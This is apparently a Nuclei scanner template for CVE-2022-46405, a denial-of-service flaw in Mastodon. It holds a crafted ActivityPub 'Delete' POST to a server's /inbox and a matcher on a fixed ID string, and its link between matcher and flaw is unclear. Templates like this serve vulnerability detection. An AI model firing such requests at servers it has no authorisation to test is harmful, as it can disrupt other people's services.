id: CVE-2022-46405

info:
  name: Mastodon Denial of Service via Recursive Messages
  author: ProjectDiscoveryAI
  severity: high
  description: Mastodon through 4.0.2 allows attackers to cause a denial of service (large Sidekiq pull queue) by creating bot accounts that follow attacker-controlled accounts on certain other servers associated with a wildcard DNS A record, leading to uncontrolled recursion of attacker-generated messages.
  impact: |
    Successful exploitation could lead to a denial of service condition
  remediation: |
    Apply the vendor-supplied patch or update to the latest version to mitigate the vulnerability
  reference:
    - https://borg.social/notes/98bcoo2t1n
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
    cvss-score: 7.5
    cve-id: CVE-2022-46405
    cwe-id: CWE-674
    epss-score: 0.00088
    epss-percentile: 0.39168
    cpe: cpe:2.3:a:joinmastodon:mastodon:*:*:*:*:*:*:*:*
  metadata:
    vendor: joinmastodon
    product: mastodon

http:
  - method: POST
    path:
      - "{{BaseURL}}/inbox"

    headers:
      Content-Type: application/json

    body: |
      {
          "@context":"https://www.w3.org/ns/activitystreams",
          "id":"https://hachyderm.io/users/vinylteque#delete",
          "type":"Delete",
          "actor":"https://hachyderm.io/users/vinylteque",
          "to":["https://www.w3.org/ns/activitystreams#Public"],
          "object":"https://hachyderm.io/users/vinylteque",
          "signature":{
              "type":"RsaSignature2017",
              "creator":"https://hachyderm.io/users/vinylteque#main-key",
              "created":"2022-12-03T18:28:09Z",
              "signatureValue":"redacted"
          }
      }
    matchers:
      - type: word
        words:
          - "109406507175403490"
        part: body
